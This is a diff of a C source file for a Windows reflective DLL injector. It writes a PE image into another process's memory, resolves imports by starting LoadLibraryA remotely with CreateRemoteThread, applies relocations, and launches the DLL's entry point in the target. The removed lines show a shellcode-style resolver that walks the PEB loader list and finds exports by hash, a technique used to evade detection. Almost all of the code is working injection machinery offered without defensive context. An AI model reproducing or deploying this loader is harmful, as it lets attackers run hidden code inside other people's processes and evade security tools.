@@ -1,28 +1,16 @@
 #include "Reflective.h"
+#include "Resource.h"
 
 void Failed(LPCSTR Message);
-
-int main()
-{
-
-}
+IMAGE_SECTION_HEADER *FindSection(PVOID RVA, IMAGE_SECTION_HEADER (*SECTION)[1], DWORD NumberOfSections);
 
 HMODULE Reflective(HANDLE hProcess, BYTE *MemoryStream)
 {
-    /*printf("[+] File Name : %s\n", DllName);
-
-    HANDLE hFile = CreateFileA(DllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    DWORD Size = GetFileSize(hFile, NULL);
-    printf("[*] File Size : %d Byte\n", Size);
-
-    BYTE* Buffer = malloc(Size);
-    ReadFile(hFile, Buffer, Size, &Size, NULL);
-    printf("[+] File Opening!\n");*/
-
     SIZE_T NumberOfBytesWritten;
     WINBOOL bSuccess;
+    IMAGE_SECTION_HEADER *Section;
 
-    ULONGLONG RowImageBase = MemoryStream;
+    ULONGLONG RawImageBase = MemoryStream;
     IMAGE_DOS_HEADER *DOS = MemoryStream;
 
     if (DOS->e_magic != MZ)
@@ -31,7 +19,7 @@ HMODULE Reflective(HANDLE hProcess, BYTE *MemoryStream)
         return NULL;
     }
 
-    IMAGE_NT_HEADERS64 *NT = RowImageBase + DOS->e_lfanew;
+    IMAGE_NT_HEADERS64 *NT = RawImageBase + DOS->e_lfanew;
 
     if (NT->Signature != PE)
     {
@@ -71,7 +59,7 @@ HMODULE Reflective(HANDLE hProcess, BYTE *MemoryStream)
     for (int i = 0; i < NT->FileHeader.NumberOfSections; i++)
     {
         printf("[+] Section name : %s\n", SECTION[i]->Name);
-        bSuccess = WriteProcessMemory(hProcess, ImageBase + SECTION[i]->VirtualAddress, RowImageBase + SECTION[i]->PointerToRawData, SECTION[i]->SizeOfRawData, &NumberOfBytesWritten);
+        bSuccess = WriteProcessMemory(hProcess, ImageBase + SECTION[i]->VirtualAddress, RawImageBase + SECTION[i]->PointerToRawData, SECTION[i]->SizeOfRawData, &NumberOfBytesWritten);
         if (!bSuccess)
         {
             Failed("Section write failed!");
@@ -81,70 +69,91 @@ HMODULE Reflective(HANDLE hProcess, BYTE *MemoryStream)
         printf("[+] Section mapping OK..!\n");
     }
 
-    IMAGE_IMPORT_DESCRIPTOR (*IMPORT)[1] = ImageBase + NT->OptionalHeader.DataDirectory[1].VirtualAddress;
+    Section = FindSection(NT->OptionalHeader.DataDirectory[1].VirtualAddress, SECTION, NT->FileHeader.NumberOfSections);
+
+    IMAGE_IMPORT_DESCRIPTOR (*IMPORT)[1] = VA2WA(RawImageBase + NT->OptionalHeader.DataDirectory[1].VirtualAddress, Section->VirtualAddress, Section->PointerToRawData);
     printf("[*] IAT Recovery\n");
 
-    PVOID SharedMemoryAddress = VirtualAllocEx(hProcess, NULL, 0, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    HMODULE hModule = GetRemoteModuleHandleA(hProcess, "kernelbase.dll");
 
-    if (SharedMemoryAddress == NULL)
+    if (hModule == NULL)
     {
-        Failed("Shared memory allocate failed!");
+        Failed("Get kernelbase.dll HMODULE failed!");
         VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
         return NULL;
     }
 
-    HMODULE (__stdcall *pGetModuleHandleA)(LPCSTR);
+    PVOID RemoteLoadLibraryA = GetRemoteProcAddress(hProcess, hModule, "LoadLibraryA");
+
+    if (RemoteLoadLibraryA == NULL)
+    {
+        Failed("Get LoadLibraryA address failed!");
+        VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
+        return NULL;
+    }
 
     for (int i = 0;; i++)
     {
         if (IMPORT[i]->OriginalFirstThunk == NULL)
             break;
 
-        PSTR LibName = ImageBase + IMPORT[i]->Name;
+        Section = FindSection(IMPORT[i]->Name, SECTION, NT->FileHeader.NumberOfSections);
+
+        LPCSTR LibName = VA2WA(RawImageBase + IMPORT[i]->Name, Section->VirtualAddress, Section->PointerToRawData);
         printf("[+] Library name : %s\n", LibName);
 
-        bSuccess = WriteProcessMemory(hProcess, SharedMemoryAddress, LibName, strlen(LibName) + 1, NULL);
-        if (!bSuccess)
+        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, RemoteLoadLibraryA, ImageBase + IMPORT[i]->Name, 0, NULL);
+
+        if (hThread == NULL)
         {
-            Failed("Write library name failed!");
+            Failed("DLL Injection failed!");
             VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
             return NULL;
         }
 
-        HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, GetModuleHandleA, SharedMemoryAddress, NULL, NULL);
+        WaitForSingleObject(hThread, INFINITE);
 
-        // HMODULE hModule;
-        // if (!(hModule = GetModuleHandleA(LibName)))
-        // {
-        //     hModule = LoadLibraryA(LibName);
-        // }
+        HMODULE hModule = GetRemoteModuleHandleA(hProcess, LibName);
+
+        if (hModule == NULL)
+        {
+            Failed("Get HMODULE failed!");
+            VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
+            return NULL;
+        }
+
+        printf("[+] HMODULE : 0x%p\n", hModule);
 
         for (int j = 0;; j++)
         {
-            IMAGE_THUNK_DATA64 *THUNK = ImageBase + IMPORT[i]->OriginalFirstThunk + j * 8;
+            Section = FindSection(IMPORT[i]->OriginalFirstThunk + j * 8, SECTION, NT->FileHeader.NumberOfSections);
+            IMAGE_THUNK_DATA64 *THUNK = VA2WA(RawImageBase + IMPORT[i]->OriginalFirstThunk + j * 8, Section->VirtualAddress, Section->PointerToRawData);
 
             if (THUNK->u1.AddressOfData == NULL)
                 break;
 
-            if (THUNK->u1.Ordinal > 0x80000000)
+            if (THUNK->u1.Ordinal >= 0x80000000)
                 *(ULONGLONG *)(ImageBase + IMPORT[i]->FirstThunk + j * 8) = GetProcAddress(hModule, MAKEINTRESOURCEA(THUNK->u1.Ordinal));
             else
             {
-                IMAGE_IMPORT_BY_NAME *IMPORT_NAME = ImageBase + THUNK->u1.AddressOfData;
+                Section = FindSection(THUNK->u1.AddressOfData, SECTION, NT->FileHeader.NumberOfSections);
+                IMAGE_IMPORT_BY_NAME *IMPORT_NAME = VA2WA(RawImageBase + THUNK->u1.AddressOfData, Section->VirtualAddress, Section->PointerToRawData);
                 printf("[+] Function name : %s\n", IMPORT_NAME->Name);
-                *(ULONGLONG *)(ImageBase + IMPORT[i]->FirstThunk + j * 8) = GetProcAddress(hModule, IMPORT_NAME->Name);
+                PVOID Function = GetRemoteProcAddress(hProcess, hModule, IMPORT_NAME->Name);
+                WriteProcessMemory(hProcess, ImageBase + IMPORT[i]->FirstThunk + j * 8, &Function, 8, NULL);
             }
         }
     }
 
     if (ImageBase != NT->OptionalHeader.ImageBase)
     {
+        printf("[*] Relocation hardcoding data\n");
         IMAGE_BASE_RELOCATION *BASE_RELOCATION = NULL;
         for (int i = 0; i < NT->FileHeader.NumberOfSections; i++)
         {
             if (NT->OptionalHeader.DataDirectory[5].VirtualAddress == SECTION[i]->VirtualAddress)
             {
-                BASE_RELOCATION = RowImageBase + SECTION[i]->PointerToRawData;
+                BASE_RELOCATION = RawImageBase + SECTION[i]->PointerToRawData;
                 break;
             }
         }
@@ -226,7 +235,7 @@ HMODULE Reflective(HANDLE hProcess, BYTE *MemoryStream)
     }
 
     DWORD TID;
-    HANDLE hThread = CreateThread(NULL, 0, CallDllMain, NT->OptionalHeader.AddressOfEntryPoint, 0, &TID); //= CreateThread2(NULL, NULL, EntryPoint, CREATE_SUSPENDED, &TID, 3, ImageBase, DLL_PROCESS_ATTACH, NULL);
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, CallDllMain, NT->OptionalHeader.AddressOfEntryPoint, 0, &TID); //= CreateThread2(NULL, NULL, EntryPoint, CREATE_SUSPENDED, &TID, 3, ImageBase, DLL_PROCESS_ATTACH, NULL);
 
     if (hThread == NULL)
     {
@@ -269,52 +278,15 @@ void Failed(LPCSTR Message)
     printf("[+] ErrorMessage : %s\n", ErrorMessage);
 }
 
-// This function is code injected(Code Injection) like shellcode
-void *SearchFunction(ULONGLONG Key)
+IMAGE_SECTION_HEADER *FindSection(PVOID RVA, IMAGE_SECTION_HEADER (*SECTION)[1], DWORD NumberOfSections)
 {
-    PEB *peb;
-    // Get PEB Address
-    __asm__ __volatile__ (
-        "mov rax, gs:[0x60]\n\t"
-        "mov %[PEB], rax\n\t"
-        : [PEB] "=m" (peb)
-    );
-    // LDR_DATA_TABLE_ENTRY *LdrDataTableEntry = peb->Ldr->InLoadOrderModuleList.Flink;
-    LDR_DATA_TABLE_ENTRY *LdrDataTableEntry = *(ULONG_PTR *)((ULONG_PTR)peb->Ldr + 8 + sizeof(PVOID));
-    // PVOID Head = &peb->Ldr->InLoadOrderModuleList;
-    PVOID Head = (ULONG_PTR)peb->Ldr + 8 + sizeof(PVOID);
-    do
+    for (int i = 0; i < NumberOfSections; i++)
     {
-        // ULONG_PTR ImageBase = LdrDataTableEntry->DllBase;
-        ULONG_PTR ImageBase = *(ULONG_PTR *)((ULONG_PTR)LdrDataTableEntry + sizeof(PVOID) * 6);
-        IMAGE_EXPORT_DIRECTORY *EXPORT = ((IMAGE_NT_HEADERS *)(((IMAGE_DOS_HEADER *)ImageBase)->e_lfanew + ImageBase))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + ImageBase;
-        if (EXPORT == ImageBase)
-            continue;
-
-        for (int i = 0; i < EXPORT->NumberOfNames; i++)
+        if (SECTION[i]->VirtualAddress <= RVA && RVA <= SECTION[i]->VirtualAddress + SECTION[i]->Misc.VirtualSize)
         {
-            DWORD length;
-            LPCSTR FunctionName = ImageBase + *(DWORD *)(ImageBase + EXPORT->AddressOfNames + i * 4);
-            
-            // This macro function is same strlen
-            STRLEN(FunctionName, length);
-
-            unsigned long long data = 0;
-
-            for (int i = 0; i < length; i++)
-            {
-                data += FunctionName[i];
-                data = (data << (FunctionName[i] & 0x0F)) ^ data;
-            }
-
-            if (data == Key)
-            {
-                WORD Index = *(WORD *)(ImageBase + EXPORT->AddressOfNameOrdinals + i * 2);
-                return ImageBase + *(DWORD *)(ImageBase + EXPORT->AddressOfFunctions + Index * 4);
-            }
+            return SECTION[i];
         }
-    } while ((LdrDataTableEntry = *(ULONG_PTR *)LdrDataTableEntry) != Head);
+    }
 
     return NULL;
 }
-void AtherFunc() {}
